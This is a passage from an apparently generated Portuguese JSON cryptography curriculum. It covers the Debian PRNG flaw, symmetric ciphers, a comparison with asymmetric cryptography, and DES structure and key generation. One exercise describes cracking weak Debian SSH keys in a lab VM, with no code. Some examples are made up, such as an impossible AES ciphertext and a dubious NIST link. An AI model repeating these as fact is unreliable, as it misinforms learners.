                                  "commonMistakes": [
                                    "Recomendações genéricas sem base em casos reais.",
                                    "Ignorar trade-offs de performance vs segurança.",
                                    "Não considerar atualizações de dependências."
                                  ]
                                }
                              ],
                              "practicalExample": "Simule a falha Debian gerando chaves RSA fracas com OpenSSL modificado em VM Debian antiga, então use um script Python para prever e crackear uma chave SSH gerada, demonstrando recuperação em menos de 1 hora.",
                              "finalVerifications": [
                                "Explicar verbalmente o ciclo de vida da falha Debian em 5 minutos.",
                                "Executar ataque de predição em PRNG customizado com acurácia >95%.",
                                "Auditar um código fonte hipotético identificando 3 riscos em PRNG.",
                                "Listar 5 mitigações NIST-compliant para PRNG em aplicações web.",
                                "Criar um diagrama de fluxo de ataque end-to-end para Debian case."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de causas raízes (80% cobertura).",
                                "Profundidade na análise de ataques (inclui simulação prática).",
                                "Qualidade e viabilidade das recomendações de mitigação.",
                                "Integração de evidências de casos reais e padrões.",
                                "Clareza na documentação e verificações autônomas.",
                                "Capacidade de conectar vulnerabilidades a impactos reais."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos números e análise de sequências pseudoaleatórias.",
                                "Programação: Implementação segura de bibliotecas criptográficas em Python/C.",
                                "Ética em TI: Responsabilidades de desenvolvedores em atualizações de código.",
                                "Gestão de Riscos: Auditoria de supply chain em software open-source.",
                                "Hardware: Entropia de fontes físicas (RDRAND, thermal noise)."
                              ],
                              "realWorldApplication": "Em equipes de segurança de TI, auditar bibliotecas criptográficas em produção para prevenir breaches como o Debian, protegendo chaves SSL/TLS em servidores web e garantindo conformidade com GDPR/PCI-DSS."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.2",
                    "name": "Cifradores Simétricos",
                    "description": "Algoritmos que usam a mesma chave para cifragem e decifragem, incluindo modos de operação como AES e DES.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.2.1",
                        "name": "Princípios dos Cifradores Simétricos",
                        "description": "Fundamentos dos algoritmos criptográficos que utilizam a mesma chave secreta tanto para o processo de cifragem quanto para decifragem de dados, destacando vantagens como velocidade e desvantagens como distribuição segura da chave.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.1.1",
                            "name": "Definir criptografia simétrica",
                            "description": "Explicar que os cifradores simétricos empregam uma única chave compartilhada para transformar texto plano em texto cifrado e vice-versa, garantindo confidencialidade em comunicações seguras.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Criptografia",
                                  "subSteps": [
                                    "Defina 'texto plano' como a mensagem original legível.",
                                    "Defina 'texto cifrado' como a mensagem transformada e ilegível.",
                                    "Explique o conceito de 'chave' como um segredo usado para transformar os dados.",
                                    "Diferencie criptografia de ofuscação simples.",
                                    "Identifique o objetivo principal: confidencialidade."
                                  ],
                                  "verification": "Escreva definições curtas para texto plano, texto cifrado e chave, confirmando com um diagrama simples.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Papel e caneta",
                                    "Vídeo introdutório sobre criptografia (ex: Khan Academy)"
                                  ],
                                  "tips": "Use analogias cotidianas, como uma fechadura e chave para visualizar.",
                                  "learningObjective": "Dominar a terminologia fundamental da criptografia.",
                                  "commonMistakes": [
                                    "Confundir chave com senha pública",
                                    "Achar que texto cifrado é irreversível"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar o Princípio da Criptografia Simétrica",
                                  "subSteps": [
                                    "Descreva que usa uma única chave compartilhada para cifrar e decifrar.",
                                    "Compare brevemente com criptografia assimétrica (duas chaves).",
                                    "Enfatize que a mesma chave é usada nos dois processos.",
                                    "Discuta a necessidade de troca segura da chave.",
                                    "Relacione com cifradores simétricos como AES ou DES."
                                  ],
                                  "verification": "Resuma em uma frase o que diferencia simétrica de assimétrica.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Quadro branco ou app de desenho",
                                    "Artigo sobre AES vs RSA"
                                  ],
                                  "tips": "Desenhe um fluxograma: remetente -> cifrar (chave) -> receptor -> decifrar (mesma chave).",
                                  "learningObjective": "Articular o cerne da criptografia simétrica.",
                                  "commonMistakes": [
                                    "Pensar que simétrica usa chaves públicas",
                                    "Ignorar riscos de compartilhamento da chave"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar o Processo de Cifragem e Decifragem",
                                  "subSteps": [
                                    "Descreva cifragem: algoritmo + texto plano + chave = texto cifrado.",
                                    "Descreva decifragem: algoritmo + texto cifrado + chave = texto plano.",
                                    "Explique como garante confidencialidade (apenas com chave se lê).",
                                    "Mencione modos de operação básicos (ex: ECB).",
                                    "Simule um exemplo manual simples como cifra de substituição."
                                  ],
                                  "verification": "Crie um exemplo com texto 'ABC', chave '1', resultando em 'BCD' e decifre de volta.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora para shifts",
                                    "Ferramenta online de cifra César"
                                  ],
                                  "tips": "Comece com cifra de César para visualizar a simetria.",
                                  "learningObjective": "Mapear o fluxo operacional da criptografia simétrica.",
                                  "commonMistakes": [
                                    "Usar algoritmos errados no exemplo",
                                    "Esquecer que chave deve ser secreta"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Verificar o Entendimento",
                                  "subSteps": [
                                    "Integre todos os conceitos em uma definição completa.",
                                    "Discuta cenários de uso em comunicações seguras.",
                                    "Identifique limitações (distribuição da chave).",
                                    "Compare com autenticação ou integridade.",
                                    "Formule uma explicação clara para um leigo."
                                  ],
                                  "verification": "Explique oralmente ou por escrito a definição completa para um parceiro.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Gravador de voz ou parceiro de estudo"
                                  ],
                                  "tips": "Pratique explicando como se fosse para uma criança de 12 anos.",
                                  "learningObjective": "Sintetizar o conhecimento em uma definição acionável.",
                                  "commonMistakes": [
                                    "Omitir a garantia de confidencialidade",
                                    "Confundir com criptografia pós-quântica"
                                  ]
                                }
                              ],
                              "practicalExample": "Alice quer enviar 'SENHA123' para Bob. Eles compartilham a chave 'CHAVESEC'. Usando AES com essa chave, 'SENHA123' vira 'X7K9P2M4Q8', que Bob decifra de volta com a mesma chave, garantindo que apenas ele leia.",
                              "finalVerifications": [
                                "Define corretamente criptografia simétrica com uma única chave.",
                                "Explica transformação bidirecional (cifrar/decifrar).",
                                "Identifica confidencialidade como benefício principal.",
                                "Distingue de criptografia assimétrica.",
                                "Fornece um exemplo prático simples.",
                                "Menciona necessidade de troca segura da chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição (100% dos elementos chave incluídos).",
                                "Clareza na explicação do processo (fluxo lógico).",
                                "Uso correto de terminologia técnica.",
                                "Inclusão de exemplo concreto e verificável.",
                                "Compreensão de implicações de segurança.",
                                "Capacidade de contrastar com assimétrica."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações modulares e funções bijetoras.",
                                "História: Evolução de cifras simétricas como Enigma na WWII.",
                                "Informática: Implementação em linguagens como Python (biblioteca cryptography).",
                                "Física: Analogias com ondas e modulação.",
                                "Ética: Implicações de privacidade em comunicações."
                              ],
                              "realWorldApplication": "Usada em VPNs (IPsec com AES) para proteger tráfego de internet, criptografia de discos (BitLocker) e protocolos como TLS para sessões seguras em bancos online."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.2",
                            "name": "Identificar vantagens e desvantagens",
                            "description": "Listar e discutir benefícios como alta performance computacional e eficiência para grandes volumes de dados, versus desafios como a necessidade de troca segura da chave e risco de comprometimento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos dos Cifradores Simétricos",
                                  "subSteps": [
                                    "Defina o que é um cifrador simétrico e como ele usa a mesma chave para cifrar e decifrar.",
                                    "Estude exemplos comuns como AES e DES, focando em suas estruturas básicas.",
                                    "Identifique os componentes principais: chave, algoritmo de substituição/permutação e modo de operação.",
                                    "Compare brevemente com cifradores assimétricos para contextualizar.",
                                    "Anote as premissas básicas de segurança (confidencialidade via segredo da chave)."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando o processo de cifragem/decifragem com a mesma chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação NIST sobre AES (aes_nist.gov)",
                                    "Vídeo introdutório no YouTube sobre criptografia simétrica",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use analogias como uma caixa-forte com uma única chave para fixar o conceito.",
                                  "learningObjective": "Compreender os princípios operacionais que fundamentam as vantagens e desvantagens.",
                                  "commonMistakes": "Confundir simétrico com assimétrico; ignorar modos de operação como CBC."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Documentar Vantagens",
                                  "subSteps": [
                                    "Liste vantagens de performance: velocidade em hardware/software moderno.",
                                    "Discuta eficiência para grandes volumes de dados (ex: streaming ou backups).",
                                    "Registre simplicidade de implementação e menor overhead computacional.",
                                    "Pesquise benchmarks comparando AES vs RSA em termos de throughput.",
                                    "Explique por que é ideal para dados em repouso ou trânsito em massa."
                                  ],
                                  "verification": "Escreva uma tabela com 4 vantagens, cada uma com justificativa técnica e exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo 'Symmetric vs Asymmetric Encryption' no site Kaspersky",
                                    "Benchmark tools como OpenSSL speed test",
                                    "Planilha Google Sheets para tabela"
                                  ],
                                  "tips": "Meça performance real rodando um script simples de cifragem em arquivos grandes.",
                                  "learningObjective": "Listar e justificar pelo menos 4 vantagens técnicas com evidências.",
                                  "commonMistakes": "Superestimar velocidade sem considerar chaves longas; ignorar contextos quânticos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Documentar Desvantagens",
                                  "subSteps": [
                                    "Analise o problema de distribuição de chaves: necessidade de canal seguro prévio.",
                                    "Discuta riscos de comprometimento: uma chave vazada expõe todos os dados.",
                                    "Liste limitações como escalabilidade em sistemas distribuídos sem PKI.",
                                    "Pesquise casos reais de falhas (ex: chaves fracas em DES).",
                                    "Compare com assimétricos para destacar dependência em segredo absoluto."
                                  ],
                                  "verification": "Crie uma lista numerada de 4 desvantagens com mitigações potenciais para cada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Relatório OWASP sobre criptografia",
                                    "Caso de estudo Heartbleed (impacto indireto em chaves)",
                                    "Notepad para listas"
                                  ],
                                  "tips": "Pense em cenários multi-usuário para realçar problemas de compartilhamento de chaves.",
                                  "learningObjective": "Reconhecer e explicar riscos inerentes com exemplos práticos.",
                                  "commonMistakes": "Subestimar impacto da troca de chaves; confundir com vulnerabilidades algorítmicas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Trade-offs e Discutir Aplicações",
                                  "subSteps": [
                                    "Compare vantagens vs desvantagens em uma matriz de decisão.",
                                    "Discuta cenários ideais: quando usar simétricos (ex: bulk data).",
                                    "Explore híbridos: simétrico + assimétrico para troca de chaves.",
                                    "Debata mitigações: key derivation functions, hardware security modules.",
                                    "Sintetize uma recomendação balanceada para uso em cibersegurança."
                                  ],
                                  "verification": "Redija um parágrafo de 200 palavras resumindo prós/contras e um caso de uso.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Whitepaper 'Cryptographic Standards' do NIST",
                                    "Ferramenta de mindmap como MindMeister",
                                    "Timer para redação"
                                  ],
                                  "tips": "Use escalas qualitativas (alta/baixo) na matriz para visualizar trade-offs.",
                                  "learningObjective": "Avaliar criticamente vantagens/desvantagens em contextos reais.",
                                  "commonMistakes": "Ignorar evolução tecnológica (ex: AES-GCM para autenticação); viés para um lado só."
                                }
                              ],
                              "practicalExample": "Em um sistema de backup corporativo com 1TB de dados sensíveis, use AES-256 para cifrar arquivos devido à alta velocidade (gigabytes/segundo), mas combine com Diffie-Hellman para troca segura inicial da chave, evitando envio por email inseguro.",
                              "finalVerifications": [
                                "Liste 4 vantagens com métricas de performance (ex: throughput > 1GB/s).",
                                "Descreva 4 desvantagens e uma mitigação para cada.",
                                "Explique por que cifradores simétricos são preferidos para dados em repouso.",
                                "Compare tempo de cifragem AES vs RSA para 1MB de dados.",
                                "Identifique risco principal: comprometimento da chave afeta quantos dados?",
                                "Crie um fluxograma de distribuição segura de chaves."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: 90% das vantagens/desvantagens corretas (4/5 pontos).",
                                "Profundidade de análise: Cada item com justificativa e exemplo (4/5 pontos).",
                                "Equilíbrio: Cobertura igual de prós e contras (3/5 pontos).",
                                "Criatividade em exemplos: Aplicações reais e viáveis (4/5 pontos).",
                                "Clareza de verificações: Passos acionáveis e mensuráveis (5/5 pontos).",
                                "Conexão com contexto: Referência a princípios de cibersegurança (4/5 pontos)"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações bitwise, funções de permutação e análise de complexidade O(n).",
                                "Redes de Computadores: Protocolos de troca de chaves como IKE/IPsec.",
                                "Ética e Direito: Implicações de vazamento de dados sob LGPD/GDPR.",
                                "Desenvolvimento de Software: Implementação segura com bibliotecas como Crypto++."
                              ],
                              "realWorldApplication": "Bancos usam AES em transações ATM para cifrar grandes volumes de dados financeiros rapidamente, mitigando riscos de chave com HSMs (Hardware Security Modules) e rotação periódica de chaves."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.3",
                            "name": "Comparar com criptografia assimétrica",
                            "description": "Diferenciar os cifradores simétricos (chave única, rápidos) dos assimétricos (chaves pública/privada, mais lentos mas seguros para troca de chaves), com exemplos de uso híbrido.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos da Criptografia Simétrica",
                                  "subSteps": [
                                    "Relembre que usa uma única chave para cifrar e decifrar dados.",
                                    "Identifique algoritmos comuns como AES e DES.",
                                    "Note vantagens: alta velocidade e eficiência para grandes volumes de dados.",
                                    "Discuta desvantagens: necessidade de troca segura da chave.",
                                    "Examine cenários de uso como armazenamento de arquivos criptografados."
                                  ],
                                  "verification": "Resuma em uma tabela as características principais da simétrica e confirme com auto-perguntas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Notas de aula anteriores, diagrama de fluxo simétrico.",
                                  "tips": "Use analogia de uma caixa de correio com uma única chave para visualizar.",
                                  "learningObjective": "Compreender as bases operacionais da criptografia simétrica.",
                                  "commonMistakes": "Confundir com assimétrica prematuramente; foque apenas na simétrica aqui."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Introduzir Conceitos da Criptografia Assimétrica",
                                  "subSteps": [
                                    "Aprenda sobre par de chaves: pública para cifrar, privada para decifrar.",
                                    "Estude algoritmos como RSA e ECC.",
                                    "Entenda a base matemática em problemas difíceis como fatoração de primos.",
                                    "Discuta benefícios: troca segura de chaves sem canal prévio seguro.",
                                    "Note desvantagens: processamento mais lento devido a operações matemáticas complexas."
                                  ],
                                  "verification": "Desenhe um diagrama mostrando o fluxo de chaves pública/privada e teste com exemplo simples.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Vídeo explicativo sobre RSA (ex: Khan Academy), calculadora para simular chaves.",
                                  "tips": "Pense na chave pública como um cadeado aberto que qualquer um pode usar, mas só o dono abre.",
                                  "learningObjective": "Dominar os princípios e componentes da criptografia assimétrica.",
                                  "commonMistakes": "Ignorar a assimetria das chaves; sempre enfatize pública vs. privada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Chave Entre Simétrica e Assimétrica",
                                  "subSteps": [
                                    "Compare gerenciamento de chaves: única vs. par.",
                                    "Analise desempenho: simétrica mais rápida para bulk data, assimétrica lenta.",
                                    "Avalie segurança na troca: simétrica requer canal seguro, assimétrica não.",
                                    "Discuta casos de uso: simétrica para confidencialidade de dados, assimétrica para autenticação.",
                                    "Crie uma tabela de prós/contras para cada."
                                  ],
                                  "verification": "Preencha uma tabela comparativa e explique verbalmente para um parceiro ou gravando.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Planilha ou papel para tabela comparativa, exemplos de algoritmos.",
                                  "tips": "Use métricas reais: AES cifra GB/s, RSA ~MB/s para destacar velocidade.",
                                  "learningObjective": "Identificar e articular diferenças críticas entre os dois tipos.",
                                  "commonMistakes": "Generalizar que assimétrica é sempre melhor; destaque trade-offs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Sistemas Híbridos e Exemplos Práticos",
                                  "subSteps": [
                                    "Entenda híbrido: assimétrica para troca de chave simétrica, simétrica para dados.",
                                    "Estude exemplo: TLS/SSL em HTTPS usa RSA para chave de sessão AES.",
                                    "Simule um fluxo híbrido: Alice envia chave simétrica cifrada com pública de Bob.",
                                    "Discuta PGP para email: híbrido para mensagens grandes.",
                                    "Avalie por que híbrido é padrão: combina velocidade e segurança."
                                  ],
                                  "verification": "Descreva um fluxo híbrido passo a passo e identifique onde cada tipo é usado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramenta online como Wireshark para capturar TLS, diagramas de protocolo.",
                                  "tips": "Visualize como um envelope: assimétrica lacra o envelope com a chave simétrica dentro.",
                                  "learningObjective": "Aplicar conceitos em cenários híbridos reais.",
                                  "commonMistakes": "Omitir o papel da simétrica nos híbridos; sempre inclua ambos."
                                }
                              ],
                              "practicalExample": "Em um site HTTPS, o navegador usa a chave pública do servidor (RSA assimétrica) para cifrar uma chave de sessão AES (simétrica), que então cifra todo o tráfego de dados rapidamente.",
                              "finalVerifications": [
                                "Explique a diferença em gerenciamento de chaves sem hesitação.",
                                "Compare velocidades com exemplos numéricos aproximados.",
                                "Descreva um fluxo híbrido completo para troca de mensagens.",
                                "Identifique quando usar cada tipo em cenários dados.",
                                "Crie uma tabela comparativa precisa.",
                                "Simule uma troca híbrida em pseudocódigo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de chaves (única vs. par).",
                                "Correta identificação de trade-offs de performance e segurança.",
                                "Compreensão clara de protocolos híbridos como TLS.",
                                "Uso de exemplos reais e analogias efetivas.",
                                "Capacidade de tabular e verbalizar comparações.",
                                "Ausência de confusões comuns como inverter papéis das chaves."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos números e algoritmos como fatoração (RSA).",
                                "Redes de Computadores: Protocolos como TLS/SSL e troca de handshakes.",
                                "Programação: Implementação de bibliotecas como OpenSSL para cifragem.",
                                "Ética e Direito: Implicações de privacidade em comunicações seguras."
                              ],
                              "realWorldApplication": "Na cibersegurança cotidiana, sistemas híbridos protegem transações bancárias online (HTTPS/TLS), emails criptografados (PGP) e VPNs, garantindo velocidade para dados massivos com segurança na inicialização de sessões."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.2",
                        "name": "Data Encryption Standard (DES)",
                        "description": "Análise do algoritmo DES, um cifrador em bloco legado de 64 bits com chave de 56 bits efetivos, baseado na rede de Feistel, e suas vulnerabilidades conhecidas.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.2.1",
                            "name": "Descrever a estrutura do DES",
                            "description": "Explicar o funcionamento em 16 rodadas de Feistel, com expansão de chave, substituição S-boxes e permutações inicial/final para cifrar blocos de 64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Visão Geral do DES e Permutação Inicial (IP)",
                                  "subSteps": [
                                    "Estude o bloco de entrada de 64 bits e a chave de 64 bits (56 efetivos + 8 paridade).",
                                    "Memorize ou anote a tabela de Permutação Inicial (IP), que rearranja os 64 bits em L0 (esquerda, 32 bits) e R0 (direita, 32 bits).",
                                    "Entenda que IP é invertível e aplicada uma vez no início.",
                                    "Desenhe um diagrama simples mostrando plaintext -> IP -> L0 R0.",
                                    "Compare IP com a Permutação Final (IP^{-1}) para notar a simetria."
                                  ],
                                  "verification": "Desenhe corretamente o fluxo inicial e aplique IP a um exemplo de 64 bits, confirmando L0 e R0.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Tabela IP do DES (RFC 4772 ou wiki), papel e caneta para diagramas, calculadora binária.",
                                  "tips": "Use cores diferentes para bits de L e R para visualizar melhor.",
                                  "learningObjective": "Compreender o pré-processamento inicial do DES e dividir o bloco em metades.",
                                  "commonMistakes": "Confundir IP com P-box da rodada; ignorar bits de paridade da chave."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estrutura de Rede Feistel e Funcionamento de uma Rodada",
                                  "subSteps": [
                                    "Aprenda a rede Feistel: Li = R(i-1), Ri = Li-1 XOR f(R(i-1), Ki), para i=1 a 16.",
                                    "Descreva f: Expansão E (32->48 bits), XOR com subchave Ki (48 bits), 8 S-boxes (48->32 bits), Permutação P (32 bits).",
                                    "Simule uma rodada manualmente com bits fictícios para rodadas 1.",
                                    "Note que após 16 rodadas, aplica-se IP^{-1} ao concatenado (R16 L16).",
                                    "Entenda por que Feistel permite descriptografia com chaves reversas."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o fluxo de uma rodada completa e simule com 32 bits de exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Diagramas Feistel (Khan Academy ou livro 'Cryptography and Network Security'), tabelas E e P.",
                                  "tips": "Pense em Feistel como um 'swap e mix' iterativo para confusão e difusão.",
                                  "learningObjective": "Dominar o ciclo principal de 16 rodadas e o papel da função f.",
                                  "commonMistakes": "Esquecer o swap final (R16 L16); confundir L e R nas atribuições."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Geração das Subchaves (Key Schedule)",
                                  "subSteps": [
                                    "Remova 8 bits de paridade da chave de 64 bits para obter 56 bits (C0 D0).",
                                    "Aplique rotações esquerdas em C e D por rodada (1 ou 2 bits, conforme tabela).",
                                    "Para cada rodada i=1-16: Selecione 48 bits via Compressão PC-2 de Ci-1 Di-1 para Ki.",
                                    "Memorize ou liste as rotações: rodadas 1,2,9,16: 1 bit; outras: 2 bits.",
                                    "Verifique com exemplo: gere K1 e K2 de uma chave sample."
                                  ],
                                  "verification": "Gere manualmente as 3 primeiras subchaves de uma chave exemplo e compare com valores conhecidos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Tabelas PC-1 e PC-2, chave exemplo (ex: 0x133457799BBCDFF1), spreadsheet para rotações.",
                                  "tips": "Use binário em grupos de 4 para facilitar contagem de rotações.",
                                  "learningObjective": "Executar o agendamento de chaves para produzir as 16 subchaves de 48 bits.",
                                  "commonMistakes": "Rotacionar errado (direita em vez de esquerda); incluir bits de paridade em C/D."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detalhes das S-boxes, Expansão E e Permutação P",
                                  "subSteps": [
                                    "Estude Expansão E: expande R (32 bits) para 48 via tabela E, duplicando alguns bits.",
                                    "Após XOR com Ki: divida 48 bits em 8 grupos de 6 bits; cada vai para uma S-box (6->4 bits).",
                                    "Entenda S-box: linha = bits 1 e 6 (decimal 0-3), coluna = bits 2-5 (0-15); saída 4 bits.",
                                    "Aplique Permutação P nos 32 bits das S-boxes para final de f.",
                                    "Anote propriedades: não-lineares para confusão contra ataques lineares."
                                  ],
                                  "verification": "Aplique E, XOR fictício, uma S-box e P a um exemplo de 32 bits de R e K.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Tabelas S1-S8, E-box, P-box (padrão DES), simulador online DES se disponível.",
                                  "tips": "Comece com S1 apenas para praticar lookup; expanda depois.",
                                  "learningObjective": "Compreender e calcular os componentes não-lineares de uma rodada.",
                                  "commonMistakes": "Índice errado em S-box (0-based vs 1-based); ignorar duplicação em E."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Permutação Final e Considerações Gerais do DES",
                                  "subSteps": [
                                    "Após 16 rodadas, concatene R16 L16 e aplique IP^{-1} (inversa da IP).",
                                    "Compare IP e IP^{-1}: memorize ou derive que IP^{-1} é permutação dos positions de IP.",
                                    "Discuta fraquezas: chave curta (56 bits), vulnerável a brute-force moderno.",
                                    "Entenda modos: ECB, CBC para blocos múltiplos (padding se necessário).",
                                    "Resuma todo fluxo: plaintext -> IP -> 16 Feistel -> IP^{-1} -> ciphertext."
                                  ],
                                  "verification": "Descreva o processo completo e aplique IP^{-1} a um exemplo final.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Tabela IP^{-1}, resumo diagrama DES completo.",
                                  "tips": "IP^{-1} é só rearranjar positions: position j em IP^{-1} é onde IP manda para j.",
                                  "learningObjective": "Finalizar a compreensão do ciclo completo e limitações do DES.",
                                  "commonMistakes": "Esquecer swap R16 L16 antes de IP^{-1}; confundir com AES."
                                }
                              ],
                              "practicalExample": "Pegue plaintext '0000...0' (64 zeros) e chave '133457799BBCDFF1'. Aplique IP para obter L0 R0, gere K1, execute rodada 1 (E, XOR K1, S-boxes, P, XOR L0 para R1), continue para rodada 2 manualmente, finalize com IP^{-1} após 16 (use ferramenta para full simulação).",
                              "finalVerifications": [
                                "Desenhar diagrama completo do DES com labels corretos para IP, rodadas, IP^{-1}.",
                                "Gerar subchaves K1-K3 corretamente de uma chave dada.",
                                "Simular uma rodada completa com valores binários fornecidos.",
                                "Explicar diferença entre confusão (S-boxes) e difusão (P, E).",
                                "Identificar por que DES usa Feistel e suas vantagens para bidirecionalidade.",
                                "Listar 3 fraquezas principais do DES."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de IP, E, S-boxes, P e key schedule (90%+ correto).",
                                "Capacidade de simular manualmente pelo menos 2 rodadas sem erros.",
                                "Explicação clara do fluxo Feistel e por que permite descriptografia simples.",
                                "Uso correto de terminologia (ex: 'subchave', 'expansão', 'permutação').",
                                "Identificação de conexões entre componentes (ex: E para matching Ki size).",
                                "Demonstração de compreensão de não-linearidade via S-boxes."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria de Grupos e Permutações (IP como bijeção).",
                                "Programação: Implementar DES em Python usando bit operations e tabelas.",
                                "Algoritmos: Redes Feistel em ciphers modernos como Blowfish.",
                                "História da Computação: Evolução de DES para 3DES e AES.",
                                "Segurança: Análise diferencial/lineares em S-boxes."
                              ],
                              "realWorldApplication": "Historicamente usado em banking (ATM PINs, EMV pré-2005), smart cards e protocolos como Kerberos; hoje legível para compatibilidade legacy, mas substituído por AES devido a brute-force (EFF DES cracker quebrou em 1998)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.2",
                            "name": "Analisar o processo de geração de chaves",
                            "description": "Detalhar como a chave de 64 bits é reduzida para 56 bits efetivos e geradas 16 chaves subchaves por rodada via rotações e compressões.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura da chave inicial de 64 bits no DES",
                                  "subSteps": [
                                    "Identifique os 64 bits da chave inicial, composta por 56 bits de chave efetiva e 8 bits de paridade.",
                                    "Localize as posições dos bits de paridade (posições 8, 16, 24, 32, 40, 48, 56, 64).",
                                    "Ignore os bits de paridade para obter os 56 bits efetivos.",
                                    "Represente a chave em binário ou hexadecimal para análise.",
                                    "Confirme que a redução para 56 bits mantém a integridade da chave."
                                  ],
                                  "verification": "Liste corretamente os 56 bits efetivos após remover os 8 bits de paridade de uma chave exemplo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Tabela de posições de paridade DES, chave exemplo em hexadecimal (ex: 133457799BBCDFF1), papel e caneta ou editor de texto binário.",
                                  "tips": "Sempre converta hexadecimal para binário agrupado em 4 bits para visualizar facilmente.",
                                  "learningObjective": "Entender como a chave de 64 bits é reduzida para 56 bits efetivos via remoção de paridade.",
                                  "commonMistakes": "Confundir bits de paridade com bits de chave; não agrupar corretamente em nibbles."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aplicar a Permutação de Compressão Inicial (PC-1)",
                                  "subSteps": [
                                    "Consulte a tabela PC-1 (56 posições selecionadas das 64 iniciais, ignorando paridade).",
                                    "Reordene os 56 bits efetivos conforme a tabela PC-1.",
                                    "Divida o resultado em duas metades: esquerda (C0, bits 1-28) e direita (D0, bits 29-56).",
                                    "Verifique a permutação aplicando-a manualmente a uma chave exemplo.",
                                    "Anote C0 e D0 para uso nas próximas etapas."
                                  ],
                                  "verification": "Gere C0 e D0 corretos para uma chave exemplo e compare com valores conhecidos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Tabela PC-1 completa (57, 49, 41, ..., 20), calculadora binária ou planilha Excel para permutações.",
                                  "tips": "Numere as posições de 1 a 64 para evitar erros de indexação zero-based.",
                                  "learningObjective": "Dominar a PC-1 para preparar as metades C e D iniciais.",
                                  "commonMistakes": "Erros de transposição na tabela PC-1; inverter esquerda/direita."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar rotações e gerar subchaves via PC-2 para cada rodada",
                                  "subSteps": [
                                    "Para rodadas 1,2,9,16: rotacione esquerda C e D por 1 bit; para outras: 2 bits (consulte tabela de shifts).",
                                    "Após rotação, aplique a tabela PC-2 para selecionar 48 bits das 56 (combinação de C e D).",
                                    "Repita para as 16 rodadas, gerando subchaves K1 a K16.",
                                    "Registre pelo menos as subchaves K1, K2 e K16 para verificação.",
                                    "Observe como rotações e PC-2 criam diversidade nas subchaves."
                                  ],
                                  "verification": "Calcule e liste subchaves corretas para rodadas 1 e 16 de uma chave exemplo.",
                                  "estimatedTime": "40 minutos",
